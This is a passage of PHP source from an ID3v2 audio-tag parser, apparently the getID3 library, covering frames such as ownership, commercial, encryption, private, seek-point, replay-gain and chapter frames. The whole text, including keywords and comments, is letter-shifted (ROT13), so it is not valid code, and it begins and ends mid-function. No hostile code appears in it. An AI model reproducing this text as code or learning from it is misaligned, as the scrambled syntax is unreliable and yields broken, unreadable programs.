			// VQ naq nqqvgvbany qngn         <grkg fgevat(f)>

			$senzr_bssfrg = 0;
			vs ($vq3i2_znwbeirefvba == 2) {
				$cnefrqSenzr['senzrvq'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 3);
				$senzr_bssfrg += 3;
			} ryfr {
				$cnefrqSenzr['senzrvq'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4);
				$senzr_bssfrg += 4;
			}

			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_hey = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			vs (beq($senzr_hey) === 0) {
				$senzr_hey = '';
			}
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");
			$cnefrqSenzr['hey'] = $senzr_hey;

			$cnefrqSenzr['nqqvgvbanyqngn'] = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
			vs (!rzcgl($cnefrqSenzr['senzranzrfubeg']) && $cnefrqSenzr['hey']) {
				$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][] = trgvq3_yvo::vpbai_snyyonpx_vfb88591_hgs8($cnefrqSenzr['hey']);
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs (($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'CBFF')) { // 4.21  CBFF Cbfvgvba flapuebavfngvba senzr (VQ3i2.3+ bayl)
			//   Gurer znl bayl or bar 'CBFF' senzr va rnpu gnt
			// <Urnq sbe 'Cbfvgvba flapuebavfngvba', VQ: 'CBFF'>
			// Gvzr fgnzc sbezng         $kk
			// Cbfvgvba                  $kk (kk ...)

			$senzr_bssfrg = 0;
			$cnefrqSenzr['gvzrfgnzcsbezng'] = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['cbfvgvba']        = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg));
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs (($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'HFRE')) { // 4.22  HFRE Grezf bs hfr (VQ3i2.3+ bayl)
			//   Gurer znl or zber guna bar 'Grezf bs hfr' senzr va n gnt,
			//   ohg bayl bar jvgu gur fnzr 'Ynathntr'
			// <Urnqre sbe 'Grezf bs hfr senzr', VQ: 'HFRE'>
			// Grkg rapbqvat        $kk
			// Ynathntr             $kk kk kk
			// Gur npghny grkg      <grkg fgevat nppbeqvat gb rapbqvat>

			$senzr_bssfrg = 0;
			$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
				$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
			}
			$senzr_ynathntr = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 3);
			$senzr_bssfrg += 3;
			$cnefrqSenzr['ynathntr']     = $senzr_ynathntr;
			$cnefrqSenzr['ynathntranzr'] = $guvf->YnathntrYbbxhc($senzr_ynathntr, snyfr);
			$cnefrqSenzr['rapbqvatvq']   = $senzr_grkgrapbqvat;
			$cnefrqSenzr['rapbqvat']     = $guvf->GrkgRapbqvatAnzrYbbxhc($senzr_grkgrapbqvat);

			$cnefrqSenzr['qngn'] = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
			$cnefrqSenzr['qngn'] = $guvf->ErzbirFgevatGrezvangbe($cnefrqSenzr['qngn'], $guvf->GrkgRapbqvatGrezvangbeYbbxhc($senzr_grkgrapbqvat));
			vs (!rzcgl($cnefrqSenzr['senzranzrfubeg']) && !rzcgl($cnefrqSenzr['qngn'])) {
				$vasb['vq3i2']['pbzzragf'][$cnefrqSenzr['senzranzrfubeg']][] = trgvq3_yvo::vpbai_snyyonpx($cnefrqSenzr['rapbqvat'], $vasb['vq3i2']['rapbqvat'], $cnefrqSenzr['qngn']);
			}
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs (($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'BJAR')) { // 4.23  BJAR Bjarefuvc senzr (VQ3i2.3+ bayl)
			//   Gurer znl bayl or bar 'BJAR' senzr va n gnt
			// <Urnqre sbe 'Bjarefuvc senzr', VQ: 'BJAR'>
			// Grkg rapbqvat     $kk
			// Cevpr cnvq        <grkg fgevat> $00
			// Qngr bs chepu.    <grkg fgevat>
			// Fryyre            <grkg fgevat nppbeqvat gb rapbqvat>

			$senzr_bssfrg = 0;
			$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
				$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
			}
			$cnefrqSenzr['rapbqvatvq'] = $senzr_grkgrapbqvat;
			$cnefrqSenzr['rapbqvat']   = $guvf->GrkgRapbqvatAnzrYbbxhc($senzr_grkgrapbqvat);

			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_cevprcnvq = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");

			$cnefrqSenzr['cevprcnvq']['pheeraplvq'] = fhofge($senzr_cevprcnvq, 0, 3);
			$cnefrqSenzr['cevprcnvq']['pheerapl']   = $guvf->YbbxhcPheeraplHavgf($cnefrqSenzr['cevprcnvq']['pheeraplvq']);
			$cnefrqSenzr['cevprcnvq']['inyhr']      = fhofge($senzr_cevprcnvq, 3);

			$cnefrqSenzr['chepunfrqngr'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 8);
			vs ($guvf->VfInyvqQngrFgnzcFgevat($cnefrqSenzr['chepunfrqngr'])) {
				$cnefrqSenzr['chepunfrqngrhavk'] = zxgvzr (0, 0, 0, fhofge($cnefrqSenzr['chepunfrqngr'], 4, 2), fhofge($cnefrqSenzr['chepunfrqngr'], 6, 2), fhofge($cnefrqSenzr['chepunfrqngr'], 0, 4));
			}
			$senzr_bssfrg += 8;

			$cnefrqSenzr['fryyre'] = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);
			$cnefrqSenzr['fryyre'] = $guvf->ErzbirFgevatGrezvangbe($cnefrqSenzr['fryyre'], $guvf->GrkgRapbqvatGrezvangbeYbbxhc($senzr_grkgrapbqvat));
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs (($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'PBZE')) { // 4.24  PBZE Pbzzrepvny senzr (VQ3i2.3+ bayl)
			//   Gurer znl or zber guna bar 'pbzzrepvny senzr' va n gnt,
			//   ohg ab gjb znl or vqragvpny
			// <Urnqre sbe 'Pbzzrepvny senzr', VQ: 'PBZE'>
			// Grkg rapbqvat      $kk
			// Cevpr fgevat       <grkg fgevat> $00
			// Inyvq hagvy        <grkg fgevat>
			// Pbagnpg HEY        <grkg fgevat> $00
			// Erprvirq nf        $kk
			// Anzr bs fryyre     <grkg fgevat nppbeqvat gb rapbqvat> $00 (00)
			// Qrfpevcgvba        <grkg fgevat nppbeqvat gb rapbqvat> $00 (00)
			// Cvpgher ZVZR glcr  <fgevat> $00
			// Fryyre ybtb        <ovanel qngn>

			$senzr_bssfrg = 0;
			$senzr_grkgrapbqvat = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$senzr_grkgrapbqvat_grezvangbe = $guvf->GrkgRapbqvatGrezvangbeYbbxhc($senzr_grkgrapbqvat);
			vs ((($vq3i2_znwbeirefvba <= 3) && ($senzr_grkgrapbqvat > 1)) || (($vq3i2_znwbeirefvba == 4) && ($senzr_grkgrapbqvat > 3))) {
				$guvf->jneavat('Vainyvq grkg rapbqvat olgr ('.$senzr_grkgrapbqvat.') va senzr \"'.$cnefrqSenzr['senzr_anzr'].'\" - qrsnhygvat gb VFB-8859-1 rapbqvat');
				$senzr_grkgrapbqvat_grezvangbe = \"\k00\";
			}

			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_cevprfgevat = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");
			$senzr_enjcevprneenl = rkcybqr('/', $senzr_cevprfgevat);
			sbernpu ($senzr_enjcevprneenl nf $xrl => $iny) {
				$senzr_pheeraplvq = fhofge($iny, 0, 3);
				$cnefrqSenzr['cevpr'][$senzr_pheeraplvq]['pheerapl'] = $guvf->YbbxhcPheeraplHavgf($senzr_pheeraplvq);
				$cnefrqSenzr['cevpr'][$senzr_pheeraplvq]['inyhr']    = fhofge($iny, 3);
			}

			$senzr_qngrfgevat = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 8);
			$senzr_bssfrg += 8;

			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_pbagnpghey = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");

			$senzr_erprvirqnfvq = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));

			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], $senzr_grkgrapbqvat_grezvangbe, $senzr_bssfrg);
			vs (beq(fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe), 1)) === 0) {
				$senzr_grezvangbecbf++; // fgecbf() sbbyrq orpnhfr 2aq olgr bs Havpbqr punef ner bsgra 0k00
			}
			$senzr_fryyreanzr = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			vs (beq($senzr_fryyreanzr) === 0) {
				$senzr_fryyreanzr = '';
			}
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe);

			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], $senzr_grkgrapbqvat_grezvangbe, $senzr_bssfrg);
			vs (beq(fhofge($cnefrqSenzr['qngn'], $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe), 1)) === 0) {
				$senzr_grezvangbecbf++; // fgecbf() sbbyrq orpnhfr 2aq olgr bs Havpbqr punef ner bsgra 0k00
			}
			$cnefrqSenzr['qrfpevcgvba'] = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			$cnefrqSenzr['qrfpevcgvba'] = $guvf->ZnxrHGS16rzcglFgevatRzcgl($cnefrqSenzr['qrfpevcgvba']);
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra($senzr_grkgrapbqvat_grezvangbe);

			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_zvzrglcr = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");

			$senzr_fryyreybtb = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);

			$cnefrqSenzr['rapbqvatvq']        = $senzr_grkgrapbqvat;
			$cnefrqSenzr['rapbqvat']          = $guvf->GrkgRapbqvatAnzrYbbxhc($senzr_grkgrapbqvat);

			$cnefrqSenzr['cevprinyvqhagvy']   = $senzr_qngrfgevat;
			$cnefrqSenzr['pbagnpghey']        = $senzr_pbagnpghey;
			$cnefrqSenzr['erprvirqnfvq']      = $senzr_erprvirqnfvq;
			$cnefrqSenzr['erprvirqnf']        = $guvf->PBZEErprvirqNfYbbxhc($senzr_erprvirqnfvq);
			$cnefrqSenzr['fryyreanzr']        = $senzr_fryyreanzr;
			$cnefrqSenzr['zvzr']              = $senzr_zvzrglcr;
			$cnefrqSenzr['ybtb']              = $senzr_fryyreybtb;
			hafrg($cnefrqSenzr['qngn']);


		} ryfrvs (($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'RAPE')) { // 4.25  RAPE Rapelcgvba zrgubq ertvfgengvba (VQ3i2.3+ bayl)
			//   Gurer znl or frireny 'RAPE' senzrf va n gnt,
			//   ohg bayl bar pbagnvavat gur fnzr flzoby
			//   naq bayl bar pbagnvavat gur fnzr bjare vqragvsvre
			// <Urnqre sbe 'Rapelcgvba zrgubq ertvfgengvba', VQ: 'RAPE'>
			// Bjare vqragvsvre    <grkg fgevat> $00
			// Zrgubq flzoby       $kk
			// Rapelcgvba qngn     <ovanel qngn>

			$senzr_bssfrg = 0;
			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_bjarevq = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			vs (beq($senzr_bjarevq) === 0) {
				$senzr_bjarevq = '';
			}
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");

			$cnefrqSenzr['bjarevq']      = $senzr_bjarevq;
			$cnefrqSenzr['zrgubqflzoby'] = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['qngn']         = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);


		} ryfrvs (($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'TEVQ')) { // 4.26  TEVQ Tebhc vqragvsvpngvba ertvfgengvba (VQ3i2.3+ bayl)

			//   Gurer znl or frireny 'TEVQ' senzrf va n gnt,
			//   ohg bayl bar pbagnvavat gur fnzr flzoby
			//   naq bayl bar pbagnvavat gur fnzr bjare vqragvsvre
			// <Urnqre sbe 'Tebhc VQ ertvfgengvba', VQ: 'TEVQ'>
			// Bjare vqragvsvre      <grkg fgevat> $00
			// Tebhc flzoby          $kk
			// Tebhc qrcraqrag qngn  <ovanel qngn>

			$senzr_bssfrg = 0;
			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_bjarevq = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			vs (beq($senzr_bjarevq) === 0) {
				$senzr_bjarevq = '';
			}
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");

			$cnefrqSenzr['bjarevq']       = $senzr_bjarevq;
			$cnefrqSenzr['tebhcflzoby']   = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['qngn']          = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);


		} ryfrvs (($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'CEVI')) { // 4.27  CEVI Cevingr senzr (VQ3i2.3+ bayl)
			//   Gur gnt znl pbagnva zber guna bar 'CEVI' senzr
			//   ohg bayl jvgu qvssrerag pbagragf
			// <Urnqre sbe 'Cevingr senzr', VQ: 'CEVI'>
			// Bjare vqragvsvre      <grkg fgevat> $00
			// Gur cevingr qngn      <ovanel qngn>

			$senzr_bssfrg = 0;
			$senzr_grezvangbecbf = fgecbf($cnefrqSenzr['qngn'], \"\k00\", $senzr_bssfrg);
			$senzr_bjarevq = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_grezvangbecbf - $senzr_bssfrg);
			vs (beq($senzr_bjarevq) === 0) {
				$senzr_bjarevq = '';
			}
			$senzr_bssfrg = $senzr_grezvangbecbf + fgeyra(\"\k00\");

			$cnefrqSenzr['bjarevq'] = $senzr_bjarevq;
			$cnefrqSenzr['qngn']    = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);


		} ryfrvs (($vq3i2_znwbeirefvba >= 4) && ($cnefrqSenzr['senzr_anzr'] == 'FVTA')) { // 4.28  FVTA Fvtangher senzr (VQ3i2.4+ bayl)
			//   Gurer znl or zber guna bar 'fvtangher senzr' va n gnt,
			//   ohg ab gjb znl or vqragvpny
			// <Urnqre sbe 'Fvtangher senzr', VQ: 'FVTA'>
			// Tebhc flzoby      $kk
			// Fvtangher         <ovanel qngn>

			$senzr_bssfrg = 0;
			$cnefrqSenzr['tebhcflzoby'] = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$cnefrqSenzr['qngn']        = (fgevat) fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg);


		} ryfrvs (($vq3i2_znwbeirefvba >= 4) && ($cnefrqSenzr['senzr_anzr'] == 'FRRX')) { // 4.29  FRRX Frrx senzr (VQ3i2.4+ bayl)
			//   Gurer znl bayl or bar 'frrx senzr' va n gnt
			// <Urnqre sbe 'Frrx senzr', VQ: 'FRRX'>
			// Zvavzhz bssfrg gb arkg gnt       $kk kk kk kk

			$senzr_bssfrg = 0;
			$cnefrqSenzr['qngn']          = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));


		} ryfrvs (($vq3i2_znwbeirefvba >= 4) && ($cnefrqSenzr['senzr_anzr'] == 'NFCV')) { // 4.30  NFCV Nhqvb frrx cbvag vaqrk (VQ3i2.4+ bayl)
			//   Gurer znl bayl or bar 'nhqvb frrx cbvag vaqrk' senzr va n gnt
			// <Urnqre sbe 'Frrx Cbvag Vaqrk', VQ: 'NFCV'>
			// Vaqrkrq qngn fgneg (F)         $kk kk kk kk
			// Vaqrkrq qngn yratgu (Y)        $kk kk kk kk
			// Ahzore bs vaqrk cbvagf (A)     $kk kk
			// Ovgf cre vaqrk cbvag (o)       $kk
			//   Gura sbe rirel vaqrk cbvag gur sbyybjvat qngn vf vapyhqrq:
			// Senpgvba ng vaqrk (Sv)          $kk (kk)

			$senzr_bssfrg = 0;
			$cnefrqSenzr['qngnfgneg'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
			$senzr_bssfrg += 4;
			$cnefrqSenzr['vaqrkrqqngnyratgu'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
			$senzr_bssfrg += 4;
			$cnefrqSenzr['vaqrkcbvagf'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 2));
			$senzr_bssfrg += 2;
			$cnefrqSenzr['ovgfcrecbvag'] = beq(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg++, 1));
			$senzr_olgrfcrecbvag = prvy($cnefrqSenzr['ovgfcrecbvag'] / 8);
			sbe ($v = 0; $v < $cnefrqSenzr['vaqrkcbvagf']; $v++) {
				$cnefrqSenzr['vaqrkrf'][$v] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $senzr_olgrfcrecbvag));
				$senzr_bssfrg += $senzr_olgrfcrecbvag;
			}
			hafrg($cnefrqSenzr['qngn']);

		} ryfrvs (($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'ETNQ')) { // Ercynl Tnva Nqwhfgzrag
			// uggc://cevingrjjj.rffrk.np.hx/~qwzebo/ercynltnva/svyr_sbezng_vq3i2.ugzy
			//   Gurer znl bayl or bar 'ETNQ' senzr va n gnt
			// <Urnqre sbe 'Ercynl Tnva Nqwhfgzrag', VQ: 'ETNQ'>
			// Crnx Nzcyvghqr                      $kk $kk $kk $kk
			// Enqvb Ercynl Tnva Nqwhfgzrag        %nnnooopq %qqqqqqqq
			// Nhqvbcuvyr Ercynl Tnva Nqwhfgzrag   %nnnooopq %qqqqqqqq
			//   n - anzr pbqr
			//   o - bevtvangbe pbqr
			//   p - fvta ovg
			//   q - ercynl tnva nqwhfgzrag

			$senzr_bssfrg = 0;
			$cnefrqSenzr['crnxnzcyvghqr'] = trgvq3_yvo::OvtRaqvna2Sybng(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
			$senzr_bssfrg += 4;
			sbernpu (neenl('genpx','nyohz') nf $etnq_ragel_glcr) {
				$et_nqwhfgzrag_jbeq = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 2));
				$senzr_bssfrg += 2;
				$cnefrqSenzr['enj'][$etnq_ragel_glcr]['anzr']       = ($et_nqwhfgzrag_jbeq & 0kR000) >> 13;
				$cnefrqSenzr['enj'][$etnq_ragel_glcr]['bevtvangbe'] = ($et_nqwhfgzrag_jbeq & 0k1P00) >> 10;
				$cnefrqSenzr['enj'][$etnq_ragel_glcr]['fvtaovg']    = ($et_nqwhfgzrag_jbeq & 0k0200) >>  9;
				$cnefrqSenzr['enj'][$etnq_ragel_glcr]['nqwhfgzrag'] = ($et_nqwhfgzrag_jbeq & 0k0100);
			}
			$cnefrqSenzr['genpx']['anzr']       = trgvq3_yvo::ETNQanzrYbbxhc($cnefrqSenzr['enj']['genpx']['anzr']);
			$cnefrqSenzr['genpx']['bevtvangbe'] = trgvq3_yvo::ETNQbevtvangbeYbbxhc($cnefrqSenzr['enj']['genpx']['bevtvangbe']);
			$cnefrqSenzr['genpx']['nqwhfgzrag'] = trgvq3_yvo::ETNQnqwhfgzragYbbxhc($cnefrqSenzr['enj']['genpx']['nqwhfgzrag'], $cnefrqSenzr['enj']['genpx']['fvtaovg']);
			$cnefrqSenzr['nyohz']['anzr']       = trgvq3_yvo::ETNQanzrYbbxhc($cnefrqSenzr['enj']['nyohz']['anzr']);
			$cnefrqSenzr['nyohz']['bevtvangbe'] = trgvq3_yvo::ETNQbevtvangbeYbbxhc($cnefrqSenzr['enj']['nyohz']['bevtvangbe']);
			$cnefrqSenzr['nyohz']['nqwhfgzrag'] = trgvq3_yvo::ETNQnqwhfgzragYbbxhc($cnefrqSenzr['enj']['nyohz']['nqwhfgzrag'], $cnefrqSenzr['enj']['nyohz']['fvtaovg']);

			$vasb['ercynl_tnva']['genpx']['crnx']       = $cnefrqSenzr['crnxnzcyvghqr'];
			$vasb['ercynl_tnva']['genpx']['bevtvangbe'] = $cnefrqSenzr['genpx']['bevtvangbe'];
			$vasb['ercynl_tnva']['genpx']['nqwhfgzrag'] = $cnefrqSenzr['genpx']['nqwhfgzrag'];
			$vasb['ercynl_tnva']['nyohz']['bevtvangbe'] = $cnefrqSenzr['nyohz']['bevtvangbe'];
			$vasb['ercynl_tnva']['nyohz']['nqwhfgzrag'] = $cnefrqSenzr['nyohz']['nqwhfgzrag'];

			hafrg($cnefrqSenzr['qngn']);

		} ryfrvs (($vq3i2_znwbeirefvba >= 3) && ($cnefrqSenzr['senzr_anzr'] == 'PUNC')) { // PUNC Puncgref senzr (VQ3i2.3+ bayl)
			// uggc://vq3.bet/vq3i2-puncgref-1.0
			// <VQ3i2.3 be VQ3i2.4 senzr urnqre, VQ: \"PUNC\">           (10 olgrf)
			// Ryrzrag VQ      <grkg fgevat> $00
			// Fgneg gvzr      $kk kk kk kk
			// Raq gvzr        $kk kk kk kk
			// Fgneg bssfrg    $kk kk kk kk
			// Raq bssfrg      $kk kk kk kk
			// <Bcgvbany rzorqqrq fho-senzrf>

			$senzr_bssfrg = 0;
			@yvfg($cnefrqSenzr['ryrzrag_vq']) = rkcybqr(\"\k00\", $cnefrqSenzr['qngn'], 2);
			$senzr_bssfrg += fgeyra($cnefrqSenzr['ryrzrag_vq'].\"\k00\");
			$cnefrqSenzr['gvzr_ortva'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
			$senzr_bssfrg += 4;
			$cnefrqSenzr['gvzr_raq']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
			$senzr_bssfrg += 4;
			vs (fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4) != \"\kSS\kSS\kSS\kSS\") {
				// \"Vs gurfr olgrf ner nyy frg gb 0kSS gura gur inyhr fubhyq or vtaberq naq gur fgneg gvzr inyhr fubhyq or hgvyvmrq.\"
				$cnefrqSenzr['bssfrg_ortva'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
			}
			$senzr_bssfrg += 4;
			vs (fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4) != \"\kSS\kSS\kSS\kSS\") {
				// \"Vs gurfr olgrf ner nyy frg gb 0kSS gura gur inyhr fubhyq or vtaberq naq gur fgneg gvzr inyhr fubhyq or hgvyvmrq.\"
				$cnefrqSenzr['bssfrg_raq']   = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
			}
			$senzr_bssfrg += 4;

			vs ($senzr_bssfrg < fgeyra($cnefrqSenzr['qngn'])) {
				$cnefrqSenzr['fhosenzrf'] = neenl();
				juvyr ($senzr_bssfrg < fgeyra($cnefrqSenzr['qngn'])) {
					// <Bcgvbany rzorqqrq fho-senzrf>
					$fhosenzr = neenl();
					$fhosenzr['anzr']      =                           fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4);
					$senzr_bssfrg += 4;
					$fhosenzr['fvmr']      = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 4));
					$senzr_bssfrg += 4;
					$fhosenzr['syntf_enj'] = trgvq3_yvo::OvtRaqvna2Vag(fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, 2));
					$senzr_bssfrg += 2;
					vs ($fhosenzr['fvmr'] > (fgeyra($cnefrqSenzr['qngn']) - $senzr_bssfrg)) {
						$guvf->jneavat('PUNC fhosenzr \"'.$fhosenzr['anzr'].'\" ng senzr bssfrg '.$senzr_bssfrg.' pynvzf gb or \"'.$fhosenzr['fvmr'].'\" olgrf, juvpu vf zber guna gur ninvynoyr qngn ('.(fgeyra($cnefrqSenzr['qngn']) - $senzr_bssfrg).' olgrf)');
						oernx;
					}
					$fhosenzr_enjqngn = fhofge($cnefrqSenzr['qngn'], $senzr_bssfrg, $fhosenzr['fvmr']);
					$senzr_bssfrg += $fhosenzr['fvmr'];

					$fhosenzr['rapbqvatvq'] = beq(fhofge($fhosenzr_enjqngn, 0, 1));
					$fhosenzr['grkg']       =     fhofge($fhosenzr_enjqngn, 1);
					$fhosenzr['rapbqvat']   = $guvf->GrkgRapbqvatAnzrYbbxhc($fhosenzr['rapbqvatvq']);
					$rapbqvat_pbairegrq_grkg = gevz(trgvq3_yvo::vpbai_snyyonpx($fhosenzr['rapbqvat'], $vasb['rapbqvat'], $fhosenzr['grkg']));
					fjvgpu (fhofge($rapbqvat_pbairegrq_grkg, 0, 2)) {
						pnfr \"\kSS\kSR\":
						pnfr \"\kSR\kSS\":
							fjvgpu (fgegbhccre($vasb['vq3i2']['rapbqvat'])) {
								pnfr 'VFB-8859-1':
								pnfr 'HGS-8':
									$rapbqvat_pbairegrq_grkg = fhofge($rapbqvat_pbairegrq_grkg, 2);
									// erzbir hajnagrq olgr-beqre-znexf
									oernx;
								qrsnhyg:
									// vtaber
									oernx;
							}
							oernx;
						qrsnhyg:
							// qb abg erzbir OBZ
							oernx;
					}

					fjvgpu ($fhosenzr['anzr']) {
						pnfr 'GVG2':
							$cnefrqSenzr['puncgre_anzr']        = $rapbqvat_pbairegrq_grkg;
							$cnefrqSenzr['fhosenzrf'][] = $fhosenzr;
							oernx;
						pnfr 'GVG3':
							$cnefrqSenzr['puncgre_qrfpevcgvba'] = $rapbqvat_pbairegrq_grkg;
							$cnefrqSenzr['fhosenzrf'][] = $fhosenzr;
							oernx;
						pnfr 'JKKK':
							@yvfg($fhosenzr['puncgre_hey_qrfpevcgvba'], $fhosenzr['puncgre_hey']) = rkcybqr(\"\k00\", $rapbqvat_pbairegrq_grkg, 2);
							$cnefrqSenzr['puncgre_hey'][$fhosenzr['puncgre_hey_qrfpevcgvba']] = $fhosenzr['puncgre_hey'];
							$cnefrqSenzr['fhosenzrf'][] = $fhosenzr;
							oernx;
						pnfr 'NCVP':
							vs (cert_zngpu('#^([^\\k00]+)*\\k00(.)([^\\k00]+)*\\k00(.+)$#f', $fhosenzr['grkg'], $zngpurf)) {
								yvfg($qhzzl, $fhosenzr_ncvp_zvzr, $fhosenzr_ncvp_cvpgherglcr, $fhosenzr_ncvp_qrfpevcgvba, $fhosenzr_ncvp_cvpgherqngn) = $zngpurf;
